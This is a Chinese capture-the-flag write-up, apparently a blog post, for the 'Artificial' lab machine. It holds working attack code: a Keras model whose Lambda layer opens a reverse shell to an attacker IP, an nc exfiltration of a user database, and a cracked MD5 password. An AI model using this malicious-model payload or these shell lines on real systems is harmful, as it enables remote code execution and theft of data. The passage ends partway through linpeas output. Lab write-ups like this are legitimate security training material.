## 信息收集

先ping看VPN连接通信，没什么问题

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ping 10.10.11.74 -c 3
PING 10.10.11.74 (10.10.11.74) 56(84) bytes of data.
64 bytes from 10.10.11.74: icmp_seq=1 ttl=63 time=266 ms
64 bytes from 10.10.11.74: icmp_seq=2 ttl=63 time=259 ms
64 bytes from 10.10.11.74: icmp_seq=3 ttl=63 time=257 ms

--- 10.10.11.74 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 257.330/260.798/266.325/3.949 ms
```

### nmap

第一步起手就是nmap

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -T5 -sV -Pn 10.10.11.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-07 06:33 EDT
Warning: 10.10.11.74 giving up on port because retransmission cap hit (2).
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.11.74
Host is up (1.4s latency).
Not shown: 538 closed tcp ports (reset), 460 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.62 seconds
```

只有两个端口开放，22和80
用浏览器打开ip，发现网址：http://artificial.htb/


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1077050bc81b474590b10cc723fa8699.png)


如果上述方法行不通可以考虑使用nmap继续探测发现域名：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sT -Pn -sV -sC -O -p22,80 10.10.11.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-07 07:09 EDT
Nmap scan report for 10.10.11.74
Host is up (0.62s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.77 seconds
```

### hosts

将域名和 IP 加到 hosts 中：

```lua
┌──(root㉿kali)-[/home/kali/Desktop]
└─# echo '10.10.11.74 artificial.htb' >> /etc/hosts
```

### gobuster

子域名探测：

```lua
┌──(root㉿kali)-[/home/kali/Desktop]
└─# gobuster vhost -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u http://artificial.htb -t 30 --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://artificial.htb
[+] Method:          GET
[+] Threads:         30
[+] Wordlist:        /usr/share/wordlists/amass/subdomains-top1mil-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: m..artificial.htb Status: 400 [Size: 166]
Found: ns2.cl.bellsouth.net..artificial.htb Status: 400 [Size: 166]                                     
Found: ns2.viviotech.net..artificial.htb Status: 400 [Size: 166]
Found: ns1.viviotech.net..artificial.htb Status: 400 [Size: 166]
Found: ns3.cl.bellsouth.net..artificial.htb Status: 400 [Size: 166]                                     
Found: ferrari.fortwayne.com..artificial.htb Status: 400 [Size: 166]                                    
Found: quatro.oweb.com..artificial.htb Status: 400 [Size: 166]
Found: jordan.fortwayne.com..artificial.htb Status: 400 [Size: 166]                                     
Progress: 5000 / 5001 (99.98%)
===============================================================
Finished
===============================================================
```

没有可访问的其他子域名

### whatweb

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# whatweb http://artificial.htb/       
http://artificial.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.74], Script, Title[Artificial - AI Solutions], nginx[1.18.0]   
```

### dirsearch

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# dirsearch -u http://artificial.htb/ -e * -x 404
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                    
 (_||| _) (/_(_|| (_| )                             

Extensions: archive-key.asc | HTTP method: GET
Threads: 25 | Wordlist size: 9481

Output File: /home/kali/Desktop/reports/http_artificial.htb/__25-07-07_08-43-33.txt

Target: http://artificial.htb/

[08:43:33] Starting:                                
[08:44:41] 302 -  199B  - /dashboard  ->  /login
[08:45:05] 200 -  857B  - /login
[08:45:08] 302 -  189B  - /logout  ->  /
[08:45:29] 200 -  952B  - /register

Task Completed                               
```

有两个页面200成功

## 边界漏洞探测

现在去网站看看可以注册登录



![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f40f0411b7de4f9bb8a3614aae1141a1.png)



这儿有个文件上传的地方，下载requirements.txt和Dockerfile，打开文件：

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat requirements.txt 
tensorflow-cpu==2.13.1

┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat Dockerfile      
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

tensorflow的一个AI模型

### docker

安装docker

```bash
apt install -y docker.io
```

更换源

```bash
sudo tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://docker.m.daocloud.io",
        "https://docker.imgdb.de",
        "https://docker-0.unsee.tech",
        "https://docker.hlmirror.com",
        "https://docker.1ms.run",
        "https://func.ink",
        "https://lispy.org",
        "https://docker.xiaogenban1993.com"
    ]
}
EOF
```

启动docker安装和镜像

```bash
systemctl daemon-reload && sudo systemctl restart docker
```

新建文件夹把dockerfile放在里面，拉取镜像

```bash
docker build -t my-image .
```

这里虚拟机连接靶场有个小问题，拉取不了docker，最后是物理机开clashTUN模式接管所有流量。

查看镜像：

```bash
┌──(root㉿kali)-[/home/kali/Downloads/tfimage]
└─# docker images             
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
tf-image     latest    19cd67d34b4f   5 minutes ago   1.46GB

┌──(root㉿kali)-[/home/kali/Downloads/tfimage]
└─# docker run -it tf-image   
root@b4396d33f085:/code# 
```

### 反弹shell

这里有篇tensorflow的漏洞文章，攻击脚本参考：
[TensorFlow Remote Code Execution with Malicious Model](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#getting-the-rce)
以下是一段攻击脚本，既然都AI了那解释咱们也AI一下

```python
import tensorflow as tf
import os

def exploit(x):
    import os
    os.system('bash -c "bash -i >& /dev/tcp/10.10.16.47/443 0>&1"')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("model.h5")
```

> 这段代码表面上是一个 **TensorFlow/Keras 深度学习模型**，但实际上包含了一个 **恶意后门**，会在加载或运行模型时执行反向 Shell 攻击（Reverse Shell Exploit）。  

---

##### **1. 导入 TensorFlow**

```python
import tensorflow as tf
```

- 导入 TensorFlow 库，用于构建深度学习模型。

##### **2. 定义 `exploit(x)` 函数（恶意代码）**

```python
def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.47 6666 >/tmp/f")
    return x
```

- **`os.system()`** 执行系统命令（Linux Shell）。
- **`rm -f /tmp/f`**：删除 `/tmp/f` 文件（如果存在）。
- **`mknod /tmp/f p`**：创建一个命名管道（FIFO 文件 `/tmp/f`）。
- **`cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.47 6666 > /tmp/f`**：
  - **`/bin/sh -i`**：启动一个交互式 Shell。
  - **`nc 10.10.16.47 6666`**：使用 `netcat` 连接到攻击者的 IP `10.10.16.47` 的 `6666` 端口。
  - **`2>&1`**：将标准错误（stderr）重定向到标准输出（stdout）。
  - **`> /tmp/f`**：将 Shell 的输出写入 `/tmp/f`，形成一个循环，使攻击者可以远程控制目标机器。
- **`return x`**：伪装成正常的 Lambda 层，返回输入数据，避免模型报错。

##### **3. 构建 Keras 模型**

```python
model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
```

- **`Sequential()`**：创建一个顺序模型。
- **`Input(shape=(64,))`**：定义输入层，接受 64 维数据。
- **`Lambda(exploit)`**：
  - `Lambda` 层通常用于自定义操作（如数学运算）。
  - 但这里被滥用，调用了 `exploit()` 函数，执行恶意代码。
- **`model.compile()`**：编译模型（无实际训练用途，仅用于保存）。

##### **4. 保存模型**

```python
model.save("exploit.h5")
```

- 将模型保存为 `exploit.h5`（HDF5 格式）。
- **攻击方式**：如果有人加载这个模型（如 `tf.keras.models.load_model("exploit.h5")`），`Lambda` 层会执行 `exploit()`，触发反向 Shell，让攻击者获得目标机器的控制权。

---

把攻击脚本传入docker后运行生成h5文件，接着传回本地：

```bash
┌──(root㉿kali)-[/home/kali/Downloads/tfimage]
└─# docker cp /home/kali/Downloads/tfimage/tfsh.py b4396d33f085:/code/exploit.py
Successfully copied 2.05kB to b4396d33f085:/code/exploit.py

┌──(root㉿kali)-[/home/kali/Downloads/tfimage]
└─# docker cp b4396d33f085:/code/exploit.h5 /home/kali/Downloads/tfimage/tf.h5
Successfully copied 11.8kB to /home/kali/Downloads/tfimage/tf.h5
```

上传到网页，点击在线预览：



![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/071d0308db454949bdd6790fc00e3b3f.png)

监听反弹：

```bash
┌──(root㉿kali)-[/home/kali/Downloads/tfimage]
└─# nc -lnvvp 6666
listening on [any] 6666 ...
connect to [10.10.16.47] from (UNKNOWN) [10.10.11.74] 60784
/bin/sh: 0: can't access tty; job control turned off
$ ls
app.py
instance
models
__pycache__
static
templates
$ ls -l
total 28
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
drwxr-xr-x 2 app app 4096 Jul  8 10:48 instance
drwxrwxr-x 2 app app 4096 Jul  8 10:48 models
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
$ whoami
app
$ pwd
/home/app/app
$ 
```

## 权限提升

### 用户权限

在instance发现一个user数据库文件，使用nc传输到本地：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nc -nlvvp 6666 > user.db           
listening on [any] 6666 ...
connect to [10.10.16.47] from (UNKNOWN) [10.10.11.74] 44846
```

```bash
$ ls
users.db
$ nc 10.10.16.47 6666 < /home/app/app/instance/users.db
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ls -l
-rw-r--r-- 1 root root 24576 Jul  8 07:33 user.db
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# sqlite3 user.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
model  user 
sqlite> SELECT * FROM user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|TestAr|TestAr@htb|402d7687e0bf27225458b789258174d2
7|AAA|fgsokl8ur2@iwatermail.com|75934e2e5e48e7a4e7b936d2efac15d8
8|aa|aa@gmail.com|4124bc0a9335c27f086f24ba207a4912
sqlite> 
```

```bash
$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

列出系统中所有使用 /bin/bash 作为默认登录 shell 的用户账户，发现geal是可登录用户，思路破解geal的hash值

### hashcat密码破解

c99175974b6e192936d97224638a34f8

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600H with Radeon Graphics, 1435/2934 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Counting lines in hash.txt. Please be patieRemoving duplicate hashes. Please be patienComparing hashes with potfile entries. PleaHashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.                               
Pure kernels can crack longer passwords, but drastically reduce performance.          
If you want to switch to optimized kernels, append -O to your commandline.            
See the above message to find out about the exact limits.                             

Watchdog: Temperature abort trigger set to 90c

Initializing device kernels and memory. PleInitializing backend runtime for device #1.Host memory required for this attack: 0 MB

Dictionary cache building /usr/share/wordliDictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

                                           [s]tatus [p]ause [b]ypass [c]heckpoint [f]i                                           c99175974b6e192936d97224638a34f8:mattp005numbertwo

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: c99175974b6e192936d97224638a34f8
Time.Started.....: Tue Jul  8 09:38:16 2025 (2 secs)
Time.Estimated...: Tue Jul  8 09:38:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2225.7 kH/s (0.08ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5722112/14344385 (39.89%)
Rejected.........: 0/5722112 (0.00%)
Restore.Point....: 5721088/14344385 (39.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: mattsimmons -> mattj33
Hardware.Mon.#1..: Util: 12%

Started: Tue Jul  8 09:38:11 2025
Stopped: Tue Jul  8 09:38:19 2025
```

### SSH登录

拿到了user权限和flag

```bash
gael@artificial:~$ whoami
gael
gael@artificial:~$ pwd
/home/gael
gael@artificial:~$ ls -l
total 4
-rw-r----- 1 root gael 33 Jul  8 09:33 user.txt
gael@artificial:~$ cat user.txt 
fdc24e9494be8acd4509f70b7fc20a38
```

### 常规提权操作

```bash
gael@artificial:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/passwd
/usr/bin/at
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

没什么有价值的利用点

#### 查找 cron 任务

啥也没有

```bash
crontab -l
ls -al /etc/cron* /var/spool/cron/crontabs/
```

### 可写目录

```bash
gael@artificial:/$ find / -type d -writable 2>/dev/null | grep -v -E "/proc|/sys|/dev"
/tmp
/tmp/.X11-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.XIM-unix
/tmp/.font-unix
/home/gael
/home/gael/.ssh
/home/gael/.cache
/var/tmp
/var/crash
/run/user/1000
/run/user/1000/gnupg
/run/screen
/run/lock
```

### 传输linpeas.sh文件

使用python把linpeas.sh文件传过去

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.74 - - [09/Jul/2025 04:53:21] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
gael@artificial:/tmp$ python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.16.47:8000/linpeas.sh', '/tmp/exploit.sh')"
```

文件先chomd 777一下，接着直接运行，好多，都贴过来了：

```bash
gael@artificial:/tmp$ ./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                        
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄                  
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄              
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄         
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄       
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄       
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄       
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄        
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄       
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄       
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄       
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄       
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄       
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄       
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄       
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄       
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄        
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄        
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄       
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄       
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄       
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀        
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀                 
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀                      

    /---------------------------------------------------------------------------------\            
    |                             Do you like PEASS?                                  |            
    |---------------------------------------------------------------------------------|            
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |            
    |         Follow on Twitter         :     @hacktricks_live                        |            
    |         Respect on HTB            :     SirBroccoli                             |            
    |---------------------------------------------------------------------------------|            
    |                                 Thank you!                                      |            
    \---------------------------------------------------------------------------------/            
          LinPEAS-ng by carlospolop                               

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.               

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html                  
 LEGEND:                         
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...                    
                               ╔═══════════════════╗              
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                
                               ╚═══════════════════╝              
OS: Linux version 5.4.0-216-generic (buildd@lcy02-amd64-014) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025
User & Groups: uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
Hostname: artificial

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)                               
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                               
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)  


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE                      

                              ╔════════════════════╗              
══════════════════════════════╣ System Information ╠══════════════════════════════                 
                              ╚════════════════════╝              
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits  
Linux version 5.4.0-216-generic (buildd@lcy02-amd64-014) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version     
Sudo version 1.8.31              


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Wed 09 Jul 2025 08:52:01 AM UTC  
 08:52:01 up 55 min,  1 user,  load average: 0.08, 0.02, 0.01

╔══════════╣ Unmounted file-system?                               
╚ Check if you can mount umounted devices                         
/dev/disk/by-id/dm-uuid-LVM-JjW1IdlYa0F62Msm8g8ssQJ0IGhvWJq1FrgtdMQbxOu05IbrUfvXyt7VqprqUnd6 / ext4 defaults 0 1
/dev/disk/by-uuid/9ec7c90e-6185-4db0-a58f-a8caab26f405 /boot ext4 defaults 0 1
proc    /proc    proc    defaults,hidepid=2    0   0
/dev/mapper/ubuntu--vg-swap     none     swap    sw      0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)               
disk                             
sda
sda1
sda2
sda3

╔══════════╣ Environment
╚ Any private information inside environment variables?           
LESSOPEN=| /usr/bin/lesspipe %s  
USER=gael
SSH_CLIENT=10.10.16.47 34790 22
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/gael
OLDPWD=/
SSH_TTY=/dev/pts/0
LOGNAME=gael
_=./linpeas.sh
TERM=xterm-256color
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
SSH_CONNECTION=10.10.16.47 34790 10.10.11.74 22

╔══════════╣ Searching Signature verification failed in dmesg     
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed               
dmesg Not Found                  

╔══════════╣ Executing Linux Exploit Suggester                    
╚ https://github.com/mzet-/linux-exploit-suggester                
[+] [CVE-2021-4034] PwnKit       

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit                            

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2                          

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write           

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE                      

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined                    
═╣ is linuxONE? ................... s390x Not Found               
═╣ grsecurity present? ............ grsecurity Not Found          
═╣ PaX bins present? .............. PaX Not Found                 
═╣ Execshield enabled? ............ Execshield Not Found          
═╣ SELinux enabled? ............... sestatus Not Found            
═╣ Seccomp enabled? ............... disabled                      
═╣ User namespace? ................ enabled                       
═╣ Cgroup2 enabled? ............... enabled                       
═╣ Is ASLR enabled? ............... Yes                           
═╣ Printer? ....................... No                            
═╣ Is this a virtual machine? ..... Yes (vmware)                  

╔══════════╣ Kernel Modules Information                           
══╣ Kernel modules with weak perms?                               

══╣ Kernel modules loadable? 
Modules can be loaded            



                                   ╔═══════════╗                  
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                
                                   ╚═══════════╝                  
╔══════════╣ Container related tools present (if any):            
/usr/sbin/apparmor_parser        
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... No                            
═╣ Any running containers? ........ No                            



                                     ╔═══════╗                    
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                
                                     ╚═══════╝                    
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz                     

═╣ GCP Virtual Machine? ................. No                      
═╣ GCP Cloud Funtion? ................... No                      
═╣ AWS ECS? ............................. No                      
═╣ AWS EC2? ............................. No                      
═╣ AWS EC2 Beanstalk? ................... No                      
═╣ AWS Lambda? .......................... No                      
═╣ AWS Codebuild? ....................... No                      
═╣ DO Droplet? .......................... No                      
═╣ IBM Cloud VM? ........................ No                      
═╣ Azure VM or Az metadata? ............. No                      
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No                      
═╣ Azure Automation Account? ............ No                      
═╣ Aliyun ECS? .......................... No                      
═╣ Tencent CVM? ......................... No                      



                ╔════════════════════════════════════════════════╗
